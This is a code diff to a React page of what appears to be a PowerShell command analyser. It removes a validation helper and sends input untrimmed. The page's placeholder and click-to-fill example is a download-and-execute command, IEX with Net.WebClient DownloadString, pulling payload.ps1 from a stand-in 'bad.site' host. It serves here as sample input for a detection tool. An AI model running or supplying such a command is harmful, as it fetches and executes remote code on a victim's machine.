@@ -28,26 +28,13 @@ export default function EvaluatePage() {
   const [command, setCommand] = useState("");
   const [loading, setLoading] = useState(false);
   const [cacheHit, setCacheHit] = useState(false);
-  const validatePowerShellCommand = (input) => {
-    if (!input || typeof input !== 'string') {
-      return { isValid: false, error: "Command cannot be empty." };
-    }
-
-    // ✅ REMOVIDO: Não verificar mais se é apenas whitespace
-    // Aceitar qualquer string, incluindo apenas espaços
-    if (input.length === 0) {
-      return { isValid: false, error: "Command cannot be empty." };
-    }
-
-    return { isValid: true, error: null };
-  };
 
   const handleAnalyze = async (e) => {
     e.preventDefault();
     
-    const validation = validatePowerShellCommand(command);
-    if (!validation.isValid) {
-      setError(validation.error);
+    // ✅ FIX: Remover validação - aceitar qualquer comando
+    if (command.length === 0) {
+      setError("Command cannot be empty.");
       return;
     }
     
@@ -61,9 +48,9 @@ export default function EvaluatePage() {
       const { getOrCreateSession, saveSessionFromBackend } = await import('../../utils/session');
       const sessionId = getOrCreateSession();
       
-      // ✅ FIX: Enviar comando sem trim - preservar espaços
+      // ✅ FIX: Enviar comando raw sem trim ou sanitização
       const requestData = { 
-        command: command, // ✅ SEM TRIM
+        command: command,
         user_id: user?.id || null,
         ip_address: ipAddress,
         country: ipCountry,
@@ -173,8 +160,7 @@ export default function EvaluatePage() {
     const newCommand = e.target.value;
     setCommand(newCommand);
     
-    // ✅ REMOVIDO: Não validar se é apenas whitespace
-    // Aceitar qualquer string
+    // ✅ FIX: Remover validação - apenas limpar erro
     setError("");
   };
 
@@ -221,7 +207,7 @@ export default function EvaluatePage() {
             <div className="flex-shrink-0 flex items-center md:pt-20">
               <ThemedButton
                 type="submit"
-                disabled={error !== "" || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
+                disabled={command.length === 0 || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
                 className="w-full md:w-auto px-6 py-3"
               >
                 {loading ? (
@@ -292,8 +278,8 @@ export default function EvaluatePage() {
           )}
 
           <InfoMessage 
-            message={!error && command.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
-            clickable={!error && command.trim() === ""}
+            message={!error && command.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+            clickable={!error && command.length === 0}
             onClick={() => setCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
           />
         </form>
